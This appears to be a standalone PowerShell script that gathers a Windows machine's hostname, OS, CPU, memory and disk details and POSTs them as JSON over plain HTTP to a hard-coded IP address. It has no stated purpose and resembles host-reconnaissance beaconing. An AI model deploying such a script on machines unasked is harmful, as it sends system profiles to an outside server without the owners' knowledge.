$hostname = $env:COMPUTERNAME
$os = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version
$cpu = Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores
$memory = Get-CimInstance Win32_ComputerSystem | Select-Object TotalPhysicalMemory
$disk = Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace

$data = @{
    hostname = $hostname
    os = $os
    cpu = $cpu
    memory = $memory
    disk = $disk
} | ConvertTo-Json -Depth 4

Invoke-RestMethod -Uri "http://20.93.23.234:8081/upload" `
                  -Method POST `
                  -ContentType "application/json" `
                  -Body $data
